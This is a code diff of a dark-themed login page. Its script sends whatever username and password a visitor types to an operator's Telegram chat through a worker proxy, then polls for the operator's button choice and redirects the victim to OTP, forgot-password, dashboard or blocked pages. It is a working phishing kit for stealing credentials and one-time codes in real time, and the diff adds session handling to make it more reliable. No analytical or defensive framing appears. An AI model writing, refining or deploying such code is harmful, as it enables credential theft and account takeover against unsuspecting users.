@@ -3,15 +3,15 @@
 <head>
   <title>Login</title>
   <style>
-    body { font-family: sans-serif; display:flex; justify-content:center; 
+    body { font-family: sans-serif; display:flex; justify-content:center;
            align-items:center; height:100vh; background:#111; color:#fff; }
     .box { background:#222; padding:30px; border-radius:10px; width:300px; }
-    input, button { width:100%; padding:10px; margin:8px 0; border-radius:6px; 
+    input, button { width:100%; padding:10px; margin:8px 0; border-radius:6px;
                     border:none; box-sizing:border-box; }
     button { background:#0088cc; color:#fff; cursor:pointer; }
     .spinner { border:4px solid #444; border-top:4px solid #fff; border-radius:50%;
-               width:36px; height:36px; animation:spin 1s linear infinite; 
-               margin:20px auto; display:none; }
+               width:36px; height:36px; animation:spin 1s linear infinite;
+               margin:20px auto; }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
@@ -23,7 +23,6 @@
     <input id="pass" type="password" placeholder="Password">
     <button onclick="submitLogin()">Login</button>
   </div>
-
   <div id="waiting" style="display:none; text-align:center;">
     <p>Verifying...</p>
     <div class="spinner"></div>
@@ -31,94 +30,86 @@
 </div>
 
 <script>
-const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-const CHAT_ID   = "YOUR_CHAT_ID_HERE";
+const PROXY   = "https://telegram-proxy.yourname.workers.dev";
+const CHAT_ID = "722615124";
 
-// Route map — button label -> page URL
 const ROUTES = {
-  "otp":      "otp.html",
-  "forgot":   "forgot.html",
-  "login":    "login.html",
-  "success":  "dashboard.html",
-  "block":    "blocked.html"
+  "otp":"otp.html", "forgot":"forgot.html", "login":"login.html",
+  "success":"dashboard.html", "block":"blocked.html"
 };
-
-let pollTimer = null;
 
 async function submitLogin() {
   const user = document.getElementById("user").value;
   const pass = document.getElementById("pass").value;
 
-  // Hide form, show spinner
-  document.getElementById("form").style.display = "none";
+  document.getElementById("form").style.display    = "none";
   document.getElementById("waiting").style.display = "block";
 
-  // Build the inline keyboard
+  const sid = crypto.randomUUID().slice(0, 8);
+
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔐 Send OTP Page",    callback_data: "otp"    }],
-      [{ text: "🔑 Forgot Password",  callback_data: "forgot" }],
-      [{ text: "↩️ Back to Login",    callback_data: "login"  }],
-      [{ text: "✅ Send to Dashboard",callback_data: "success"}],
-      [{ text: "🚫 Block User",       callback_data: "block"  }]
+      [{ text:"🔐 OTP",       callback_data:`otp:${sid}`     }],
+      [{ text:"🔑 Forgot",    callback_data:`forgot:${sid}`  }],
+      [{ text:"↩️ Login",     callback_data:`login:${sid}`   }],
+      [{ text:"✅ Dashboard", callback_data:`success:${sid}` }],
+      [{ text:"🚫 Block",     callback_data:`block:${sid}`   }]
     ]
   };
 
-  // Get the offset first so we only react to NEW updates
-  const meResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
-  const meData = await meResp.json();
-  const lastId = meData.result.length ? meData.result[meData.result.length-1].update_id : 0;
+  // get current offset
+  const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
+  const d0 = await r0.json();
+  const startOffset = d0.result && d0.result.length
+    ? d0.result[d0.result.length - 1].update_id + 1
+    : 0;
 
-  // Send login details + buttons
-  const text = `🔔 *New Login Attempt*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n\nChoose next page:`;
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+  // send login + buttons
+  await fetch(`${PROXY}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type":"application/json"},
     body: JSON.stringify({
       chat_id: CHAT_ID,
-      text: text,
-      parse_mode: "Markdown",
+      text: `🔔 Login attempt\n👤 ${user}\n🔑 ${pass}\nSession: ${sid}`,
       reply_markup: keyboard
     })
   });
 
-  // Start polling for the button press
-  pollForDecision(lastId + 1);
+  pollLoop(startOffset, sid);
 }
 
-function pollForDecision(offset) {
-  pollTimer = setInterval(async () => {
+async function pollLoop(offset, sid) {
+  while (true) {
     try {
-      const r = await fetch(
-        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5`
-      );
+      const r = await fetch(`${PROXY}/getUpdates?offset=${offset}&timeout=15`);
       const data = await r.json();
+      if (!data.result) continue;
 
       for (const upd of data.result) {
         offset = upd.update_id + 1;
+        const cb = upd.callback_query;
+        if (!cb) continue;
 
-        if (upd.callback_query) {
-          const choice = upd.callback_query.data;
-          const target = ROUTES[choice] || "login.html";
+        const [action, sess] = cb.data.split(":");
+        if (sess !== sid) continue;
 
-          // Acknowledge the button press (removes loading spinner on Telegram)
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-            method: "POST",
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({
-              callback_query_id: upd.callback_query.id,
-              text: "Redirecting user..."
-            })
-          });
+        await fetch(`${PROXY}/answerCallbackQuery`, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({
+            callback_query_id: cb.id,
+            text: "Redirecting user..."
+          })
+        });
 
-          // Redirect the user
-          clearInterval(pollTimer);
-          window.location.href = target;
-          return;
-        }
+        window.location.href = ROUTES[action] || "login.html";
+        return;
       }
-    } catch(e) { console.error(e); }
-  }, 2000);
+    } catch (e) {
+      console.error(e);
+      await new Promise(r => setTimeout(r, 2000));
+    }
+  }
 }
 </script>
 </body>
